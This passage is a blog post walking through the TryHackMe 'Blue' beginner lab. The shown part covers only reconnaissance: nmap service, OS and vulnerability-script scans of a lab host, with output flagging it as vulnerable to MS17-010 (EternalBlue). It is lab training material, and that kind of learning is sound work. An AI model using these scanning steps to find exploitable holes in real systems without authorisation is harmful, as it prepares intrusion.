<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>THM - Learn - Offensive Pentesting - Blue - Pascal's Blog</title><meta name=description content="Welcome to my personal blog!"><meta property="og:title" content="THM - Learn - Offensive Pentesting - Blue"><meta property="og:description" content="TryHackMe - Learn - Offensive Pentesting - Blue Task 1: Recon Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-09T03:58:23+02:00"><meta property="article:modified_time" content="2022-04-09T03:58:23+02:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="THM - Learn - Offensive Pentesting - Blue"><meta name=twitter:description content="TryHackMe - Learn - Offensive Pentesting - Blue Task 1: Recon Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused."><meta name=application-name content="FeelIt"><meta name=apple-mobile-web-app-title content="FeelIt"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/><link rel=prev href=https://blog.ppeinecke.de/posts/ritsecctf-crypto-lost-in/><link rel=next href=https://blog.ppeinecke.de/posts/htb-starting-point-responder/><link rel=stylesheet href=/css/page.min.71c564da5b3f4eba95cbab8f0b60ebca631b65f6fa00249cad5936d8015a03635811dfec5b4a84c1c8d864b7fcc22ff6c1daffcee4875ce8de4a6e9ef5a236db.css integrity="sha512-ccVk2ls/TrqVy6uPC2DrymMbZfb6ACScrVk22AFaA2NYEd/sW0qEwcjYZLf8wi/2wdr/zuSHXOjeSm6e9aI22w=="><link rel=stylesheet href=/css/home.min.2246d1d9af15d10979fc73ed48565a5aba50ecce3faec166f3a56c0c66b5b5336cbd39ca9e94b38ebf4c4489d48a8da367f8c0e130daa104d6b3be7bf7213ff0.css integrity="sha512-IkbR2a8V0Ql5/HPtSFZaWrpQ7M4/rsFm86VsDGa1tTNsvTnKnpSzjr9MRInUio2jZ/jA4TDaoQTWs7579yE/8A=="><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"THM - Learn - Offensive Pentesting - Blue","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.ppeinecke.de\/posts\/thm-learn-offensive-pentesting-blue\/"},"genre":"posts","keywords":"tryhackme, thm, privesc, windows, eternal blue, metasploit","wordcount":6093,"url":"https:\/\/blog.ppeinecke.de\/posts\/thm-learn-offensive-pentesting-blue\/","datePublished":"2022-04-09T03:58:23+02:00","dateModified":"2022-04-09T03:58:23+02:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Author"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Pascal's Blog"><span id=id-1 class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/>Posts </a><a class=menu-item href=/categories>Categories </a><a class=menu-item href=/tags>Tags </a><a class=menu-item href=/about>About </a><a class=menu-item href=/contact>Contact Me </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=# class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a class=menu-item href=/index.xml title=RSS><i class="fas fa-rss fa-fw" title=RSS></i> </a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Pascal's Blog"><span id=id-2 class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=# class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/ title>Posts</a><a class=menu-item href=/categories title>Categories</a><a class=menu-item href=/tags title>Tags</a><a class=menu-item href=/about title>About</a><a class=menu-item href=/contact title>Contact Me</a><div class=menu-item><a href=/index.xml title=RSS><i class="fas fa-rss fa-fw" title=RSS></i></a>
<span>&nbsp;|&nbsp;</span><a href=javascript:void(0); class=theme-switch title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single" data-toc=enable><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/featuredImages/blue-thumbnail.png data-srcset="/featuredImages/blue-thumbnail.png, /featuredImages/blue-thumbnail.png 1.5x, /featuredImages/blue-thumbnail.png 2x" data-sizes=auto alt=/featuredImages/blue-thumbnail.png title=/featuredImages/blue-thumbnail.png></div><div class=single-card data-image=true><h2 class="single-title animated flipInX">THM - Learn - Offensive Pentesting - Blue</h2><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title="Pascal Peinecke" rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Pascal Peinecke</a></span>&nbsp;<span class=post-category>published in <a href=/categories/pwn/><i class="far fa-folder fa-fw"></i>pwn</a>&nbsp;<a href=/categories/privesc/><i class="far fa-folder fa-fw"></i>privesc</a>&nbsp;<a href=/categories/tryhackme/><i class="far fa-folder fa-fw"></i>tryhackme</a></span></div><div class=post-meta-line><span><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-04-09>2022-04-09</time></span>&nbsp;<span><i class="fas fa-pencil-alt fa-fw"></i>&nbsp;6093 words</span>&nbsp;
<span><i class="far fa-clock fa-fw"></i>&nbsp;29 minutes</span>&nbsp;</div></div><hr><div class="details toc" id=toc-static data-kept=true><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#task-1-recon>Task 1: Recon</a><ul><li><a href=#scan-and-learn-what-exploit-this-machine-is-vulnerable-to-please-note-that-this-machine-does-not-respond-to-ping-icmp-and-may-take-a-few-minutes-to-boot-up-this-room-is-not-meant-to-be-a-boot2root-ctf-rather-this-is-an-educational-series-for-complete-beginners-professionals-will-likely-get-very-little-out-of-this-room-beyond-basic-practice-as-the-process-here-is-meant-to-be-beginner-focused>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</a></li></ul></li><li><a href=#task-2-gain-access>Task 2: Gain Access</a><ul><li><a href=#exploit-the-machine-and-gain-a-foothold>Exploit the machine and gain a foothold.</a></li></ul></li><li><a href=#task-3-escalate>Task 3: Escalate</a><ul><li><a href=#escalate-privileges-learn-how-to-upgrade-shells-in-metasploit>Escalate privileges, learn how to upgrade shells in metasploit.</a></li></ul></li><li><a href=#task-4-cracking>Task 4: Cracking</a><ul><li><a href=#dump-the-non-default-users-password-and-crack-it>Dump the non-default user&rsquo;s password and crack it!</a></li></ul></li><li><a href=#task-5-find-flags>Task 5: Find flags!</a><ul><li><a href=#find-the-three-flags-planted-on-this-machine-these-are-not-traditional-flags-rather-theyre-meant-to-represent-key-locations-within-the-windows-system-use-the-hints-provided-below-to-complete-this-room>Find the three flags planted on this machine. These are not traditional flags, rather, they&rsquo;re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</a></li></ul></li></ul></nav></div></div><div class=content id=content><h1 id=tryhackme---learn---offensive-pentesting---blue>TryHackMe - Learn - Offensive Pentesting - Blue</h1><hr><h2 id=task-1-recon>Task 1: Recon</h2><h3 id=scan-and-learn-what-exploit-this-machine-is-vulnerable-to-please-note-that-this-machine-does-not-respond-to-ping-icmp-and-may-take-a-few-minutes-to-boot-up-this-room-is-not-meant-to-be-a-boot2root-ctf-rather-this-is-an-educational-series-for-complete-beginners-professionals-will-likely-get-very-little-out-of-this-room-beyond-basic-practice-as-the-process-here-is-meant-to-be-beginner-focused>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</h3><hr><ul><li>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>IP</span><span class=o>=</span><span class=s2>&#34;10.10.14.17&#34;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir nmap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo nmap -sC -sV -v -O <span class=nv>$IP</span> -o nmap/initial
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Sat Apr  9 02:01:41 2022 as: nmap -sC -sV -v -O -o nmap/initial 10.10.14.17</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.14.17
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.039s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>991</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE      VERSION
</span></span><span class=line><span class=cl>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> microsoft-ds <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>3389/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>Jon-PC
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>Jon-PC
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>2048</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-04-07T23:52:22
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid after:  2022-10-07T23:52:22
</span></span><span class=line><span class=cl><span class=p>|</span> MD5:   <span class=m>9796</span> 2e4d cd63 7fe6 b315 ab65 f94c 0baf
</span></span><span class=line><span class=cl><span class=p>|</span>_SHA-1: 4ff6 <span class=m>8427</span> ce68 f8d3 2e98 a71f f0e9 cd4c <span class=m>9658</span> 1e1a
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2022-04-09T00:03:10+00:00<span class=p>;</span> +1s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: JON-PC
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: JON-PC
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: JON-PC
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: Jon-PC
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: Jon-PC
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 6.1.7601
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2022-04-09T00:02:55+00:00
</span></span><span class=line><span class=cl>49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49158/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49159/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class=o>)</span>.
</span></span><span class=line><span class=cl>TCP/IP fingerprint:
</span></span><span class=line><span class=cl>OS:SCAN<span class=o>(</span><span class=nv>V</span><span class=o>=</span>7.92%E<span class=o>=</span>4%D<span class=o>=</span>4/9%OT<span class=o>=</span>135%CT<span class=o>=</span>1%CU<span class=o>=</span>41609%PV<span class=o>=</span>Y%DS<span class=o>=</span>2%DC<span class=o>=</span>I%G<span class=o>=</span>Y%TM<span class=o>=</span>6250CD3
</span></span><span class=line><span class=cl>OS:D%P<span class=o>=</span>x86_64-pc-linux-gnu<span class=o>)</span>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>106%GCD<span class=o>=</span>1%ISR<span class=o>=</span>10B%TI<span class=o>=</span>I%CI<span class=o>=</span>I%II<span class=o>=</span>I%SS<span class=o>=</span>S%TS<span class=o>=</span>
</span></span><span class=line><span class=cl>OS:7<span class=o>)</span>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>106%GCD<span class=o>=</span>1%ISR<span class=o>=</span>10B%TI<span class=o>=</span>I%CI<span class=o>=</span>I%TS<span class=o>=</span>7<span class=o>)</span>OPS<span class=o>(</span><span class=nv>O1</span><span class=o>=</span>M505NW8ST11%O2<span class=o>=</span>M505NW8S
</span></span><span class=line><span class=cl>OS:T11%O3<span class=o>=</span>M505NW8NNT11%O4<span class=o>=</span>M505NW8ST11%O5<span class=o>=</span>M505NW8ST11%O6<span class=o>=</span>M505ST11<span class=o>)</span>WIN<span class=o>(</span><span class=nv>W1</span><span class=o>=</span><span class=m>200</span>
</span></span><span class=line><span class=cl>OS:0%W2<span class=o>=</span>2000%W3<span class=o>=</span>2000%W4<span class=o>=</span>2000%W5<span class=o>=</span>2000%W6<span class=o>=</span>2000<span class=o>)</span>ECN<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>2000%O<span class=o>=</span>M50
</span></span><span class=line><span class=cl>OS:5NW8NNS%CC<span class=o>=</span>N%Q<span class=o>=)</span>T1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%S<span class=o>=</span>O%A<span class=o>=</span>S+%F<span class=o>=</span>AS%RD<span class=o>=</span>0%Q<span class=o>=)</span>T2<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%
</span></span><span class=line><span class=cl>OS:W<span class=o>=</span>0%S<span class=o>=</span>Z%A<span class=o>=</span>S%F<span class=o>=</span>AR%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T3<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>Z%A<span class=o>=</span>O%F<span class=o>=</span>AR%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=</span>
</span></span><span class=line><span class=cl>OS:<span class=o>)</span>T4<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>A%A<span class=o>=</span>O%F<span class=o>=</span>R%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T5<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>Z%A<span class=o>=</span>
</span></span><span class=line><span class=cl>OS:S+%F<span class=o>=</span>AR%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T6<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>A%A<span class=o>=</span>O%F<span class=o>=</span>R%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T7<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF
</span></span><span class=line><span class=cl>OS:<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>Z%A<span class=o>=</span>S+%F<span class=o>=</span>AR%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>U1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>N%T<span class=o>=</span>80%IPL<span class=o>=</span>164%UN<span class=o>=</span>0%RIPL<span class=o>=</span>
</span></span><span class=line><span class=cl>OS:G%RID<span class=o>=</span>G%RIPCK<span class=o>=</span>G%RUCK<span class=o>=</span>G%RUD<span class=o>=</span>G<span class=o>)</span>IE<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DFI<span class=o>=</span>N%T<span class=o>=</span>80%CD<span class=o>=</span>Z<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Uptime guess: 0.009 days <span class=o>(</span>since Sat Apr  <span class=m>9</span> 01:50:42 2022<span class=o>)</span>
</span></span><span class=line><span class=cl>Network Distance: <span class=m>2</span> hops
</span></span><span class=line><span class=cl>TCP Sequence Prediction: <span class=nv>Difficulty</span><span class=o>=</span><span class=m>262</span> <span class=o>(</span>Good luck!<span class=o>)</span>
</span></span><span class=line><span class=cl>IP ID Sequence Generation: Incremental
</span></span><span class=line><span class=cl>Service Info: Host: JON-PC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 0s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2022-04-09T00:02:55
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2022-04-08T23:52:20
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.1: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:5e:37:02:b6:59 <span class=o>(</span>unknown<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Names:
</span></span><span class=line><span class=cl><span class=p>|</span>   JON-PC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   JON-PC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=se>\x</span>01<span class=se>\x</span>02__MSBROWSE__<span class=se>\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> <span class=o>(</span>Windows <span class=m>7</span> Professional 6.1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: Jon-PC
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: JON-PC<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Workgroup: WORKGROUP<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2022-04-08T19:02:55-05:00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Sat Apr  9 02:03:09 2022 -- 1 IP address (1 host up) scanned in 88.10 seconds</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>How many ports are open with a port number under 1000?</li></ul><p>There are 3 ports open with a port number under 1000:</p><p><code>135, 139 and 445</code></p><ul><li>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -v --script<span class=o>=</span>vuln -o nmap/vuln <span class=nv>$IP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Sat Apr  9 02:09:41 2022 as: nmap -v --script=vuln -o nmap/vuln 10.10.14.17</span>
</span></span><span class=line><span class=cl>Pre-scan script results:
</span></span><span class=line><span class=cl><span class=p>|</span> broadcast-avahi-dos: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Discovered hosts:
</span></span><span class=line><span class=cl><span class=p>|</span>     224.0.0.251
</span></span><span class=line><span class=cl><span class=p>|</span>   After NULL UDP avahi packet DoS <span class=o>(</span>CVE-2011-1002<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span>_  Hosts are all up <span class=o>(</span>not vulnerable<span class=o>)</span>.
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.14.17
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.034s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>991</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE
</span></span><span class=line><span class=cl>135/tcp   open  msrpc
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds
</span></span><span class=line><span class=cl>3389/tcp  open  ms-wbt-server
</span></span><span class=line><span class=cl>49152/tcp open  unknown
</span></span><span class=line><span class=cl>49153/tcp open  unknown
</span></span><span class=line><span class=cl>49154/tcp open  unknown
</span></span><span class=line><span class=cl>49158/tcp open  unknown
</span></span><span class=line><span class=cl>49159/tcp open  unknown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
</span></span><span class=line><span class=cl><span class=p>|</span>_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
</span></span><span class=line><span class=cl><span class=p>|</span>_smb-vuln-ms10-054: <span class=nb>false</span>
</span></span><span class=line><span class=cl><span class=p>|</span> smb-vuln-ms17-010: 
</span></span><span class=line><span class=cl><span class=p>|</span>   VULNERABLE:
</span></span><span class=line><span class=cl><span class=p>|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span class=o>(</span>ms17-010<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     State: VULNERABLE
</span></span><span class=line><span class=cl><span class=p>|</span>     IDs:  CVE:CVE-2017-0143
</span></span><span class=line><span class=cl><span class=p>|</span>     Risk factor: HIGH
</span></span><span class=line><span class=cl><span class=p>|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
